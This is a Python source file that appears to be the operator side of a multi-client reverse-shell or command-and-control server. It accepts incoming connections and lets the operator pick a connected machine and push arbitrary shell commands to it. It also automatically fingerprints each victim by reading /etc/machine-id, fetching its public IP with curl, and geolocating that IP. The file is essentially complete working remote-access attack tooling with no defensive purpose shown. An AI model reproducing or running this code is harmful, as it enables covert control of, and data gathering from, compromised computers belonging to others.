import requests
import json
import os
import socket
import threading
import time
from configparser import ConfigParser, ParsingError
from queue import Queue
from src import source

config = ConfigParser()
queue = Queue()

THREADS = 2
JOBS = [1, 2]
CONNECTIONS = []
IP_ADDRESSES = []


def socket_settings():
    try:
        config.read("./src/settings.ini")
        ss_settings = config['Socket_Server']
        host = ss_settings['host']
        port = ss_settings['port']
        return host, port
    except (KeyError, ValueError, ParsingError) as e:
        print(f"\n[!] Error reading settings.ini:\n[!] {e}\n\n")
        source.shutdown()    

def socket_server_thread():
    create_threads()
    create_jobs()

def create_threads():
    try:
        for _ in range(THREADS):
            t = threading.Thread(target=work)
            t.daemon = True
            t.start()
    except Exception:
        print('\n[!] Error')

def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            time.sleep(1)
            command_menu()
            return

def create_jobs():
    for x in JOBS:
        queue.put(x)
    queue.join()

def socket_create():
    try:
        global ss
        ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error as e:
        print(f"\n[!] Socket creation error: {e}")

def socket_bind():
    try:
        host, port = socket_settings()
        global ss
        ss.bind((host, int(port)))
        ss.listen(5)
        print(f"\n[*] Listening on {host}:{port}")
    except socket.error as e:
        print(f"\n[!] Socket binding error: {e}")
        time.sleep(5)
        socket_bind()

def accept_connections():
    for c in CONNECTIONS:
        c.close()
    del CONNECTIONS[:]
    del IP_ADDRESSES[:]

    while True:
        try:
            conn, address = ss.accept()
            #conn.setblocking(True)
            CONNECTIONS.append(conn)
            IP_ADDRESSES.append(address)
            print(f"\n[*] Connection established: {address[0]}\n[+] > ", end="")
        except:
            print("\n[!] Error accepting connections")

def list_connections():
    results = ""
    for i, conn in enumerate(CONNECTIONS):
        try:
            conn.send(str.encode(' '))
            conn.recv(2048)
        except:
            del CONNECTIONS[i]
            del IP_ADDRESSES[i]
            continue
        results += f"+ {i}  {IP_ADDRESSES[i][0]}:{IP_ADDRESSES[i][1]} \n "
    print(f'[*] ----- clients ----- \n\n {results}\n')
    return results

def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = CONNECTIONS[target]
        print(f"\n[*] connected to {IP_ADDRESSES[target][0]}")
        print(f"{IP_ADDRESSES[target][0]} $ ", end="")
        return conn
    except Exception:
        print(f"\n[!] {target} is not a valid selection")
        return None

def get_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'exit':
                return
            response = send_target_commands(cmd, conn)
            print(response, end="")
        except:
            print('\n[!] Unknown error (get_target_commands)')

def send_target_commands(cmd, conn):
    try:
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")

            return client_response
    except Exception:
        print("\n[!] Connection to client was lost")
        return

def target_info(conn):
    try:
        conn.send(str.encode('cat /etc/machine-id'))
        client_hwid = str(conn.recv(1024), "utf-8")
        hwid = client_hwid.split(maxsplit=1)[0]

        conn.send(str.encode('curl ident.me'))
        client_ipaddr = str(conn.recv(1024), "utf-8")
        client_ip = client_ipaddr.split(maxsplit=1)[0]

        return hwid, client_ip
    except socket.error as e:
        print(f"\n[!] Connection to client was lost {e}")

def parse_target_ip(target_ip):
    try:
        r = requests.get(f"https://dazzlepod.com/ip/{target_ip}.json")
        target_ip_info = json.dumps(r.json(), indent =4, sort_keys=False)
        return target_ip_info
    except requests.ConnectionError as e:
        print(f'\n[!] Connection error parsing target ip info')


def command_menu():
    #queue.task_done()
    while True:
        cmd = input("\n[>] ")
        match (cmd.lower()):
            case "list":
                list_connections()
            case s if s.startswith("select"):
                conn = get_target(cmd)
                hwid, target_ip = target_info(conn)
                target_ip_info = parse_target_ip(target_ip)
                print(f"\n[+] hwid: {hwid}\n[+] ip info:\n{target_ip_info}\n[$] ")
                if conn is not None:
                    pass
            case "shell" | "sh":
                    get_target_commands(conn) 
            case "clear" | "cls":
                os.system('clear')
            case "shutdown":
                source.shutdown()
            case _:
                print(f"\n[!] command not recognized: {cmd}")
